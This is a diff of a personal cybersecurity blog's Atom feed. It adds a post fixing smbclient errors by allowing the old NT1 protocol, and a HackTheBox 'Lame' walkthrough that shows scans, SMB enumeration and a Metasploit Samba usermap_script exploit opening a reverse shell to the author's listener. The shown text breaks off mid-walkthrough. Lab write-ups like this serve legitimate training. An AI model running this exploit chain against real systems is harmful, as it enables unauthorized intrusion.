@@ -1,5 +1,47 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-23T15:03:45-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zack Jones</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
-</subtitle><author><name>Zack Jones</name></author><entry><title type="html">Because Resumes Just Aren’t That Good</title><link href="http://localhost:4000/blog/2020/09/03/Because-Resumes.html" rel="alternate" type="text/html" title="Because Resumes Just Aren’t That Good" /><published>2020-09-03T16:30:00-04:00</published><updated>2020-09-03T16:30:00-04:00</updated><id>http://localhost:4000/blog/2020/09/03/Because-Resumes</id><content type="html" xml:base="http://localhost:4000/blog/2020/09/03/Because-Resumes.html">&lt;h1 id=&quot;oh-hello&quot;&gt;Oh.. hello&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://hiimzackjones.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://hiimzackjones.github.io/" rel="alternate" type="text/html" /><updated>2020-09-30T23:07:41-04:00</updated><id>http://hiimzackjones.github.io/feed.xml</id><title type="html">Zack Jones</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
+</subtitle><author><name>Zack Jones</name></author><entry><title type="html">Smbclient Giving Weird Errors - A Fix.</title><link href="http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html" rel="alternate" type="text/html" title="Smbclient Giving Weird Errors - A Fix." /><published>2020-09-30T18:55:00-04:00</published><updated>2020-09-30T18:55:00-04:00</updated><id>http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix</id><content type="html" xml:base="http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html">&lt;p&gt;So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbclient.png&quot; alt=&quot;smbclient error&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/smbclient.png&quot; alt=&quot;smbclient error 2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After doing some research, I found out that it was because smbclient was trying to use a higher version of Samba. So I’m writing this quick post as a reminder to myself how to fix it but hopefully it will help some of you guys out as well.&lt;/p&gt;
+
+&lt;p&gt;First find the Samba conf file. It’s almost always in /etc/samba/smb.conf. I ran a quick find just in case.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Linux/SambaConfPost/SambaVersionFind.png&quot; alt=&quot;Finding Samba Conf file&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then I hopped onto the conf and added NT1 as the lowest accepted version.&lt;/p&gt;
+
+&lt;p&gt;I added this to the Global section of the file -&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;min protocol = NT1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/Linux/SambaConfPost/SambaConfEdit.png&quot; alt=&quot;SMB Conf Edit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;This is a good time to mention that you most likely want to have your SMB version as high as possible on machines you’d like to protect from SMB vulnerabilities. This works fine for a pentesting machine, but any other machine maybe should be set to highest possible. Here are some options for setting it. Here are some more options for setting the version.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;min protocol = SMB2
+min protocol = SMB3
+client min protocol = SMB2
+max protocol = SMB2
+protocol = SMB3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Notice you can set it to a specific SMB version, lowest version, highest version, and the same settings for client side.&lt;/p&gt;
+
+&lt;p&gt;Okay lets go back and test to see what happens.&lt;br /&gt;
+&lt;em&gt;But first&lt;/em&gt; - make sure to reset your smb service.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo systemctl restart smbd.service
+or 
+sudo systemctl restart smb.service
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;when I restart the service it still didn’t work correctly. So I restarted the machine to make sure the correct service was restarted and it worked!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Linux/SambaConfPost/SMBFixed.png&quot; alt=&quot;Imagine of it working goes here&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Okay there ya go. Hope this helps if you’re getting similar NT errors while poking at CTFs or even pentesting!&lt;/p&gt;
+
+&lt;p&gt;Cheers, 
+Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Linux" /><summary type="html">So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.</summary></entry><entry><title type="html">Because Resumes Just Aren’t That Good</title><link href="http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes.html" rel="alternate" type="text/html" title="Because Resumes Just Aren’t That Good" /><published>2020-09-03T16:30:00-04:00</published><updated>2020-09-03T16:30:00-04:00</updated><id>http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes</id><content type="html" xml:base="http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes.html">&lt;h1 id=&quot;oh-hello&quot;&gt;Oh.. hello&lt;/h1&gt;
 &lt;p&gt;If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience &lt;a href=&quot;/blog/2020/09/03/Resume.html&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;
 
 &lt;h1 id=&quot;who-i-am&quot;&gt;Who I am&lt;/h1&gt;
@@ -53,7 +95,467 @@ I also realized that the curriculum was extremely dry for a room of teens hoping
   &lt;li&gt;Google how to enumerate each port you find. Make notes.&lt;/li&gt;
   &lt;li&gt;Write what you’ve done. Take the time to do this. Write the most basic version of what your process was like. A few weeks or months later, go back to edit the notes, forcing you to follow them and re-work the box.&lt;/li&gt;
   &lt;li&gt;Publish things and have a professional critique your process.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Oh.. hello If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience click here.</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Oh.. hello If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience click here.</summary></entry><entry><title type="html">Lame HTB Writeup</title><link href="http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup.html" rel="alternate" type="text/html" title="Lame HTB Writeup" /><published>2020-05-17T18:00:00-04:00</published><updated>2020-05-17T18:00:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup.html">&lt;p&gt;Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out &lt;a href=&quot;/infosec/2020/05/15/Legacy-HTB-Writeup.html&quot;&gt;Legacy&lt;/a&gt; first. Feel free to use my writeup for that one as well.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/WebsiteScreenshot.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If this writeup isn’t enough, HTB does include &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/1&quot;&gt;a writeup&lt;/a&gt; on the site. There are also plenty of videos online how to do this box as well.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Here we gooo&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;As per usual, we are going to start with some basic scanning to figure out what this bad boy is running and try to find any vulnerabilities right off the bat. Similar to the Legacy box we did, I will scan it using two methods. &lt;strong&gt;Big Nmap&lt;/strong&gt; and &lt;strong&gt;NmapAutomator&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A -T4 -p- 10.10.10.3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Note: you might need do throw a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; on it. Additionally, much of my notes are from the first time I broke into this box. I went back a second time to grab screenshots, in doing so, it seems that some of the results were different. For example the FTP server showed up as 2.3.4 one time and 3 the next. We can just make a note of that for now.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/nmap.png&quot; alt=&quot;Nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:09 EDT
+ Nmap scan report for 10.10.10.3
+Host is up (0.11s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.27
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -3d00h56m27s, deviation: 2h49m45s, median: -3d02h56m29s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-09-26T14:25:22-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 158.93 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s break this scan down to some bullet points of useful information.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Machine info&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;OS - Linux/Unix&lt;/li&gt;
+  &lt;li&gt;Hostname - Lame&lt;/li&gt;
+  &lt;li&gt;Domain - Hackthebox.gr&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Ports open&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;21 - FTP&lt;/li&gt;
+  &lt;li&gt;22 - SSH&lt;/li&gt;
+  &lt;li&gt;139 - netbios-ssn (evidence of smb)&lt;/li&gt;
+  &lt;li&gt;445 - microsoft-ds (more evidence of smb)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Extra info&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Anonymous FTP allowed&lt;/li&gt;
+  &lt;li&gt;OpenSSH version 4.7p1&lt;/li&gt;
+  &lt;li&gt;ports 139 &amp;amp; 445 suggest SMB&lt;/li&gt;
+  &lt;li&gt;Samba version 3.0.20 - Debian&lt;/li&gt;
+  &lt;li&gt;port 3632 for distccd (distcc compiler)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Looking ahead, we can already guess that smb is going to be the low hanging fruit. Possibly even FTP as well. The distccd was something I had yet to run into before, we will look at that later. Before we go any further let’s compare notes against a NmapAutomator scan.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-automator&quot;&gt;Nmap Automator&lt;/h2&gt;
+&lt;p&gt;So I’ve mentioned this script before, if you’re interested in seeing what all it scans and tests out, head over to the Github and read the documentation.
+&lt;a href=&quot;https://github.com/21y4d/nmapAutomator/&quot;&gt;NmapAutomator Github&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If I were to take a screenshot, it would take up a massive part of the page. So I’ve linked a live video of the scan running below. Feel free to take a look. The video allows for copy and paste as well.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/pPTcqnbAhrYWhSQhLOe8cc7bo&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/pPTcqnbAhrYWhSQhLOe8cc7bo.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Or you can just look at the file here - &lt;a href=&quot;/assets/img/Walkthroughs/Lame/Lame-nmap-auto.txt&quot;&gt;nmapAutomator-Scan-File&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Out of this massive scan, there are a few things we have learned about this machine that could be useful moving forward. I’ve pulled snippets from the full scan.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So we got a confirmation on ports here.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.27
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Oof!&lt;/em&gt; FTP anonymous login is accepted.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Samba version here.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Another oof!&lt;/em&gt; Challenge response is supported &lt;strong&gt;but&lt;/strong&gt; message signing is disabled. Good ole default settings here.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:4.7p1: 
+|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
+|_      CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Some cute little CVEs for the SSH just in case FTP and SMB doesn’t give us any love here. It later lists these vulnerabilities.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| vulners: 
+|   cpe:/a:openbsd:openssh:4.7p1: 
+|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
+|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
+|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657
+|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
+|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
+|       CVE-2007-2768   4.3     https://vulners.com/cve/CVE-2007-2768
+|       CVE-2014-9278   4.0     https://vulners.com/cve/CVE-2014-9278
+|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
+|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
+|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
+|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
+|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|       https://distcc.github.io/security.html
+|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Wellll welll well. Looks like this weird port that I’ve never seen before has a CVE for it as well. AND it’s highly vulnerable. Awesome. Looking good for us bad guys so far.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------------Running Recon Commands----------------------
+
+
+Starting smbmap scan
+
+[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
+Disk                                                    Permissions     Comment
+----                                                    -----------     -------
+print$                                                  NO ACCESS       Printer Drivers
+tmp                                                     READ, WRITE     oh noes!
+opt                                                     NO ACCESS
+IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+
+Finished smbmap scan
+
+=========================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;LMAO OOOOF&lt;/em&gt; we keep finding goodies here. Looks like we have read and write in the 10.10.10.3:445/tmp location here kids. This could be extra useful.&lt;/p&gt;
+
+&lt;h2 id=&quot;smb-enum&quot;&gt;SMB Enum&lt;/h2&gt;
+&lt;p&gt;So I would be slacking if I didn’t write out some specific ways to enumerate SMB. Our nmapAutomater.sh script really did great work, but even after all that, I would highly suggest picking out something to focus on from that list of interesting fellas, and focus on it. Confirm it yourself, and then move forward. So let’s do some SMB enumeration real quick like.&lt;/p&gt;
+
+&lt;h2 id=&quot;smbmap&quot;&gt;SMBMap&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbmap.png&quot; alt=&quot;SMBMapScreenshot&quot; /&gt;
+Okay that looks about right. Identical to what we saw before.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbmap2.png&quot; alt=&quot;SMBMapScreenshot&quot; /&gt;
+Adding -R gives a little bit more information by going recursively into the folders.&lt;/p&gt;
+
+&lt;h2 id=&quot;smbclient&quot;&gt;smbclient&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbclient.png&quot; alt=&quot;smbclient screenshot&quot; /&gt;&lt;br /&gt;
+Great so we can successfully login with no password. It even tells us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Anonymous login successful&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Being that this is a CTF, we can be a little messy. Let’s test our ability to put a file on the file server anonymously.&lt;br /&gt;
+&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbclientpoke.png&quot; alt=&quot;smbput test&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sweet! We are able to put files on the victim machine. This could be our ticket.&lt;/p&gt;
+
+&lt;h2 id=&quot;smb-version-samba-smbd-3020-debian&quot;&gt;SMB version Samba smbd 3.0.20-Debian&lt;/h2&gt;
+
+&lt;p&gt;Okay let’s take a peek around to see what we can find for vulnerabilities for SMB.&lt;/p&gt;
+
+&lt;p&gt;A quick little &lt;em&gt;searchsploit&lt;/em&gt; search shows some tasty stuff. 
+&lt;img src=&quot;/assets/img/Walkthroughs/Lame/searchsploit.png&quot; alt=&quot;searchsploit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The one in paticular that stands out is the Samba 3.0.20 Command Execution with a Metasploit module.&lt;br /&gt;
+It’s the exact version and it’s code execution which is &lt;em&gt;mwah chefs kiss&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s do some searching on metasploit real fast to see what we can find.&lt;br /&gt;
+&lt;img src=&quot;/assets/img/Walkthroughs/Lame/MetasploitSearch1.png&quot; alt=&quot;MetasploitSearch1&quot; /&gt;&lt;br /&gt;
+Oh geez. There is quite a few here. Let’s go about this differently. A quick Google search found &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script&quot;&gt;this little fella.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/MetasploitModuleSite.png&quot; alt=&quot;Site Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The site says that it works on Samba 3.0.20 which is perfect. The site also gives us the CVE on this. &lt;strong&gt;CVE-2007-2447&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;We can google the CVE to get some more information about it to know what we are dealing with.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447&quot;&gt;CVE info from Mitre&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2007-2447&quot;&gt;CVE info from Nist.gov&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.exploit-db.com/exploits/16320&quot;&gt;CVE Exploit on EDB&lt;/a&gt;&lt;br /&gt;
+That last link is the same script we were looking at from the Searchsploit. It’s starting to look like this might be our best bet. Let’s take a look at it from Metasploit.&lt;/p&gt;
+
+&lt;h2 id=&quot;smb-exploit&quot;&gt;SMB Exploit&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/MetasploitModule.png&quot; alt=&quot;Finding it in Metasploit&quot; /&gt;
+Doing a quick search finds this module.&lt;/p&gt;
+
+&lt;p&gt;Let’s go ahead and use it and see what the options are.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/multi/samba/usermap_script
+ msf5 exploit(multi/samba/usermap_script) &amp;gt; options
+ 
+ Module options (exploit/multi/samba/usermap_script):
+ 
+ Name    Current Setting  Required  Description
+ ----    ---------------  --------  -----------
+ RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+ RPORT   139              yes       The target port (TCP)
+ 
+ 
+ Exploit target:
+ 
+ Id  Name
+ --  ----
+ 0   Automatic
+ 
+ 
+ msf5 exploit(multi/samba/usermap_script) &amp;gt; set rhost 10.10.10.3
+ rhost =&amp;gt; 10.10.10.3
+ msf5 exploit(multi/samba/usermap_script) &amp;gt; run
+ 
+ [*] Started reverse TCP double handler on 10.10.14.17:4444 
+ [*] Accepted the first client connection...
+ [*] Accepted the second client connection...
+ [*] Command: echo uoDexrJBt0bwYHdC;
+ [*] Writing to socket A
+ [*] Writing to socket B
+ [*] Reading from sockets...
+ [*] Reading from socket B
+ [*] B: &quot;uoDexrJBt0bwYHdC\r\n&quot;
+ [*] Matching...
+ [*] A is input...
+ [*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46751) at 2020-05-11 23:14:41 -0400
+ 
+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Holy Gaucammmoooellee. That was quick and easy. We didn’t even have to enumerate the other ports.&lt;/p&gt;
+
+&lt;h2 id=&quot;shell&quot;&gt;Shell&lt;/h2&gt;
+&lt;p&gt;So now we have some sort of shell. It’s not perfect and it’s kind of wonky. But we can test it out real quick.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/Exploit.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is prettty ugly. But you can tell that I was able to ls, and pwd. Also move into the root folder and find the root.txt and cat it out. So. Technically this box is rooted. Maybe we should check for other users real quick.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/passwd.png&quot; alt=&quot;passwd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Okay so looking through this, you can see your typical passwd list and there is one that stands out called Makis. Let’s see if we can get to Makis home folder.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/movingaround.png&quot; alt=&quot;movingaround&quot; /&gt;&lt;/p&gt;
+
